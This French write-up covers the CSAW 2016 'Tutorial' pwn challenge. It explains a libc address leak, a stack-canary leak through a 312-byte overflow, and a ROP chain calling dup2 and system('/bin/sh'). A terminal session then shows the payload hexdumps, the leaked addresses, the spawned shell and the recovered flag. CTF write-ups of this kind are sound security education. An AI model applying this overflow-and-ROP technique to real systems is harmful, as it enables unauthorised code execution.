#Tutorial

3 entrées dans le menu:
la première fournie l'adresse de puts - 0x500 dans la libc.
La deuxième commande permet d'avoir une fuite en faisant un overflow de 312
caractères (dont le \n) et d'obtenir le canari. Il ne reste plus qu'à
enchainer un rop classique effectuant deux dup2 et un system('/bin/sh')
pour avoir le shell. Cela donne la session suivante:

```
francois@athos:~/BFF/beers4flags/writeups/csaw2016/pwn/Tutorial$ python exploit-0.py 1
(1) -Tutorial-
1.Manual
2.Practice
3.Quit
>
(2) Reference:0x7fad235d3860
-Tutorial-
1.Manual
2.Practice
3.Quit
>
Time to test your exploit...
> (1)
00000000 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000010 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000020 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000030 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000040 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000050 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000060 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000070 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000080 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000090 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000a0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000b0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000c0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000d0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000e0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000f0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000100 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000110 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000120 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000130 :  41 41 41 41   41 41 41 a0     00 b1 98 67   90 5d c9 70       AAAA AAA.  ...g .].p  
00000140 :  d0 67 2f c1   2d 54 75 74     6f 72 69 61   6c 2d a0 31       .g/. -Tut  oria l-.1  
00000150 :  2e 4d 61 6e   75 61 6c a0     32 2e 50 72   61 63 74 69       .Man ual.  2.Pr acti  
00000160 :  63 65 a0 33   2e 51 75 69     74 a0 3e   ce.3 .Qui  t.>
(C) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
��g�]�p�g/�-Tutorial-
1.Manual
2.Practice
3.Quit
>
Canari= 70c95d906798b100
320
DUP2= 7fad2364fe90
SYSTEM= 7fad235aa590
SH= 7fad236e08c3
00000000 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000010 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000020 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000030 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000040 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000050 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000060 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000070 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000080 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000090 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000a0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000b0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000c0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000d0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000e0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
000000f0 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000100 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000110 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000120 :  41 41 41 41   41 41 41 41     41 41 41 41   41 41 41 41       AAAA AAAA  AAAA AAAA  
00000130 :  41 41 41 41   41 41 41 41     00 b1 98 67   90 5d c9 70       AAAA AAAA  ...g .].p  
00000140 :  41 41 41 41   41 41 41 00     e3 12 40 00   00 00 00 00       AAAA AAA.  ..@. ....  
00000150 :  40 00 00 00   00 00 00 00     e1 12 40 00   00 00 00 00       .... ....  ..@. ....  
00000160 :  00 00 00 00   00 00 00 00     41 41 41 41   41 41 41 00       .... ....  AAAA AAA.  
00000170 :  90 fe 64 23   ad 7f 00 00     e3 12 40 00   00 00 00 00       ..d# ...  ..@. ....  
00000180 :  40 00 00 00   00 00 00 00     e1 12 40 00   00 00 00 00       .... ....  ..@. ....  
00000190 :  10 00 00 00   00 00 00 00     41 41 41 41   41 41 41 00       .... ....  AAAA AAA.  
000001a0 :  90 fe 64 23   ad 7f 00 00     e3 12 40 00   00 00 00 00       ..d# ...  ..@. ....  
000001b0 :  c3 80 6e 23   ad 7f 00 00     90 a5 5a 23   ad 7f 00 00       ..n# ...  ..Z# ...  
  
let's go? y
(1) -Tutorial-
1.Manual
2.Practice
3.Quit
>
2 Time to test your exploit...
>
3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��g�]�pAAAA
>ls
ls
(*) flag.txt
tutorial
tutorial.c
/home/tutorial

>cat flag.txt
cat flag.txt
(*) FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
/home/tutorial

>Traceback (most recent call last):
  File "exploit-0.py", line 372, in <module>
    chaine=raw_input(">")
EOFError
francois@athos:~/BFF/beers4flags/writeups/csaw2016/pwn/Tutorial$ 
```
